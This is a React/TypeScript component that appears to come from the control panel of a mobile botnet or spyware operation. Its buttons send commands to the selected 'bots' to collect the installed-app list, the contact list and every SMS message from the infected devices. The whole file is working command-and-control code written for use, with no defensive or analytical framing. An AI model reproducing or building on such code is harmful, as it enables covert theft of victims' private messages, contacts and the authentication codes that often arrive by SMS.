import { useContext } from 'react';
import { Button, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default ({load}: {load: () => void}) => {
  const { state, setState } = useContext(BotContext)

  const getInstalledApp = () => {

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"getInstallApps"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }

  const getContacts = () => {
    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"getContacts"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }

  const getAllSMS = () => {
    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"getSMS"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }

  return (
    <div className="pb-6">
      <h2 className="text-xl">Get data from bots</h2>
      <p className="text-stone-500">Get data from selected bots</p>
      <div className='flex'>
        <Button ghost type="primary" className='flex-1 mr-1' onClick={getInstalledApp}>Get installed app</Button>
        <Button ghost type="primary" className='flex-1 ml-1 mr-1' onClick={getContacts}>Get contacts</Button>
        <Button ghost type="primary" className='flex-1 ml-1' onClick={getAllSMS}>Get all SMS</Button>
      </div>
    </div>
  )
}